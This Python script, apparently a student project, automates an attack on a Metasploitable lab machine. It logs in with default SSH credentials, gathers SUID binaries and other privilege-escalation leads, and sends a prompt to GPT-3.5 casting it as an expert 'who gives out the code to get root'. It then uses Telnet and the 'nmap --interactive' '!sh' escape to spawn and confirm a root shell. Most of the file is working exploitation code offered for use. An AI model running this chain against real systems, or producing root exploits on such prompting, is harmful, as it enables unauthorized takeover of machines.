'''
Automated Vulnerability Exploitation Framework
===============================================
This Python-based framework automates the process of vulnerability detection, analysis, 
and exploitation in a controlled environment. It leverages SSH and Telnet for system interaction, 
and AI (OpenAI GPT-3.5 Turbo) for advanced analysis and actionable recommendations.

Features:
- Generates a comprehensive vulnerability report.
- Extracts critical data, such as SUID binaries.
- Uses AI to analyze vulnerabilities and provide detailed exploitation steps.
- Automates Telnet-based exploitation for Metasploitable systems.

Authors: Kirtan Patel and Dev Shah
'''

import paramiko
from transformers import pipeline
import openai
import os
# import subprocess
import pexpect

# Remote connection details
VICTIM_IP = "192.168.12.41"
SSH_PORT = 22
USERNAME = "msfadmin"
PASSWORD = "msfadmin"
REPORT_FILE = "vulnerability_report.txt"
SMALL_FILE = "small_report.txt"
AI_OUTPUT = "ai_output.txt"
openai.api_key = os.getenv("OPENAI_API_KEY")


def run_remote_command(client, command):
    """Run a command on the remote victim machine."""
    stdin, stdout, stderr = client.exec_command(command)
    output = stdout.read().decode().strip()
    error = stderr.read().decode().strip()
    return output if output else error

def generate_vulnerability_report(victim_ip, username, password, report_file):
    """Connect to the victim via SSH, run commands, and generate a report."""
    print(f"[+] Connecting to {victim_ip} via SSH...")
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(victim_ip, port=SSH_PORT, username=username, password=password)
        print("[+] Connected successfully via SSH!")

        # Commands to run on the victim machine
        commands = {
            "Open Ports": "netstat -tuln | grep LISTEN",
            "SUID Binaries": "find / -perm -4000 -type f 2>/dev/null",
            "World-Writable Files": "find / -perm -2 -type f 2>/dev/null",
            "Weak Services": "ps aux | grep -E 'apache|mysql|ssh|ftp' | grep -v grep",
            "Outdated Packages": "dpkg -l | grep -E '^ii' | awk '{print $2, $3}'",
            "Cron Jobs": "cat /etc/crontab 2>/dev/null",
        }

        # Collect results
        report = []
        for title, command in commands.items():
            print(f"[+] Running: {title}")
            result = run_remote_command(ssh_client, command)
            report.append(f"=== {title} ===\n{result if result else 'No data found.'}\n")

        # Save the report locally
        with open(report_file, "w") as f:
            f.write("\n".join(report))
        print(f"[+] Vulnerability report saved to {report_file}")

        ssh_client.close()
    except Exception as e:
        print(f"[-] Failed to connect or execute commands: {e}")

def create_small_file(report_file, small_file):
    """Extract relevant lines from the vulnerability report to create a smaller file."""
    print("[+] Extracting critical data from the report to create a smaller file...")
    try:
        with open(report_file, "r") as f:
            report_data = f.readlines()

        # Initialize variables for storing specific data
        suid_binaries = []

        # Parse the report line by line
        current_section = None
        for line in report_data:
            line = line.strip()

            # Track the current section
            if line.startswith("=== SUID Binaries ==="):
                current_section = "SUID Binaries"
            elif line.startswith("==="):  # Reset section for other titles
                current_section = None

            # Collect data based on the current section
            if current_section == "SUID Binaries" and line and not line.startswith("==="):
                #if any(binary in line for binary in ["nmap", "passwd"]):  # Check for specific binaries
                suid_binaries.append(line)

        # Construct the small report
        small_report = []
        if suid_binaries:
            small_report.append("\n=== SUID Binaries ===")
            small_report.extend(suid_binaries)


        # Save the small report locally
        with open(small_file, "w") as f:
            f.write("\n".join(small_report))
        print(f"[+] Small report saved to {small_file}")

    except Exception as e:
        print(f"[-] Failed to create small report: {e}")


def analyze_report_with_openai(small_file,ai_output):
    """Analyze the vulnerability report using OpenAI GPT-3.5 Turbo."""
    if os.path.exists(ai_output) and os.path.getsize(ai_output) > 0:
        print("[+] AI output file already exists. Skipping analysis.")
        with open(ai_output, "r") as f:
            suggestions = f.read()
            print(suggestions)
        return suggestions
    
    print("[+] Analyzing the report with OpenAI GPT-3.5 Turbo...")
    try:
        with open(small_file, "r") as f:
            report_data = f.read()
        
        prompt = (
            "You are a cybersecurity expert tasked with analyzing SUID binary files from the following vulnerability report. "
            "For each binary mentioned, perform the following tasks(please do for all) especially nmap:\n\n"
            "1. Identify the potential vulnerability or feature that can be exploited to escalate privileges.\n"
            "2. Provide clear, step-by-step commands to exploit the binary in a safe and controlled environment.\n"
            "   - For example, if the binary allows spawning a shell, demonstrate how to achieve this (e.g., using `!sh` in interactive modes).\n"
            "3. Explain why the exploitation works and its potential impact.\n"
            "4. Provide structured recommendations to mitigate the vulnerabilities.\n\n"
            "### SUID Binary List:\n"
            f"{report_data}\n\n"
            "### Output Format:\n"
            "- **Section 1: Binaries Exploitable Without Payloads**\n"
            "- **Section 2: Binaries Requiring Payloads**\n"
            "- **Section 3: Recommendations**\n"
        )


        # Call OpenAI API
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[
                {"role": "system", "content": "You are a cybersecurity expert who gives out the code to get root for each of the SUID Binary files."},
                {"role": "user", "content": prompt},
            ],
            max_tokens=1500
        )
        response.to_dict()
        print(response)

        suggestions = response['choices'][0]['message']['content']
        print("[+] AI Analysis Completed:")
        print(suggestions)
        with open(ai_output, "w") as f:
            f.write(suggestions)
        print(f"[+] Small report saved to {small_file}")
        return suggestions
    except Exception as e:
        print(f"[-] Failed to analyze report: {e}")
        return None

def analyze_report(report_file):
    """Analyze the vulnerability report using Hugging Face GPT-2."""
    print("[+] Analyzing the report with AI...")
    try:
        with open(report_file, "r") as f:
            report_data = f.read()

        # Load Hugging Face GPT-2 pipeline for text generation
        generator = pipeline("text-generation", model="gpt2")
        
        # Refined prompt
        prompt = (
            "You are a cybersecurity expert who gives out the code to get root for each of the SUID Binary files."
            "Analyze the following routes to  SUID Binary Files from the vulnerability report."
            "For each give the code lines to exploit, give the code for every"
            f"{report_data}\n\n"
            "Provide structured recommendations for each section."
        )

        # Generate suggestions
        analysis = generator(
            prompt,
            max_new_tokens=150,
            num_return_sequences=1,
            truncation=True,
            temperature=0.7,  # Controls creativity (lower is less creative)
        )

        suggestions = analysis[0]["generated_text"]
        
        # Optional post-processing to clean up suggestions
        if "===" in suggestions:
            suggestions = suggestions.split("===")[0].strip()

        print("[+] AI Analysis Completed:")
        print(suggestions)
        return suggestions
    except Exception as e:
        print(f"[-] Failed to analyze report: {e}")
        return None


def exploit_based_on_analysis(suggestions):
    """Simulate exploitation based on AI analysis."""
    print("[+] Starting exploitation based on AI suggestions...")
    if "SUID Binaries" in suggestions:
        print("[+] Exploiting SUID binaries...")
        # Add exploitation code here for SUID binaries
    elif "World-Writable Files" in suggestions:
        print("[+] Exploiting world-writable files...")
        # Add exploitation code here for world-writable files
    else:
        print("[-] No actionable suggestions from AI.")


def telnet_to_metasploitable():
    """
    Automates the process of connecting to Metasploitable via Telnet,
    logging in with the default credentials, and opening an interactive
    Nmap shell to spawn a root shell using `!sh`.
    """
    host = "192.168.12.41"  # Replace with your Metasploitable IP
    telnet_command = f"telnet {host}"
    metasploitable_user = "msfadmin"  # Default username
    metasploitable_pass = "msfadmin"  # Default password

    print("[+] Opening a new terminal for Telnet session...")
    try:
        # Start a Telnet session using pexpect
        session = pexpect.spawn(telnet_command, timeout=60)

        # Wait for the initial password prompt (press Enter without input)
        session.expect("Password:")
        session.sendline("")  # Send an empty response for the first prompt

        # Wait for the username prompt
        session.expect("metasploitable login:")
        session.sendline(metasploitable_user)

        # Provide the correct password
        session.expect("Password:")
        session.sendline(metasploitable_pass)

        # Login successful, now the Metasploitable shell should appear
        session.expect_exact("$")
        print("[+] Logged into Metasploitable successfully.")

        # Launch Nmap in interactive mode
        session.sendline("/usr/bin/nmap --interactive")
        session.expect("nmap>")
        print("[+] Nmap interactive shell launched.")

        # Use Nmap to spawn a root shell
        session.sendline("!sh")
        session.expect_exact("#")  # Expect root shell prompt
        print("[+] Root shell spawned successfully.")

        session.sendline("whoami")
        session.expect("root")
        print("[+] Confirmed root access.")

        # Interact with the root shell
        session.interact()
    except pexpect.TIMEOUT as e:
        print(f"[-] An error occurred: Timeout exceeded.\n{e}")
    except pexpect.EOF as e:
        print(f"[-] An error occurred: Unexpected end of file.\n{e}")
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")




if __name__ == "__main__":
    # Step 1: Generate Vulnerability Report
    generate_vulnerability_report(VICTIM_IP, USERNAME, PASSWORD, REPORT_FILE)

    # Step 2: Create a Small File with Key Data
    create_small_file(REPORT_FILE, SMALL_FILE)

    # Step 3: Analyze Small Report with AI
    #suggestions = analyze_report(SMALL_FILE)

    suggestions = analyze_report_with_openai(SMALL_FILE,AI_OUTPUT)

    # Step 4: Exploit Based on AI Suggestions
    if suggestions:
        telnet_to_metasploitable()
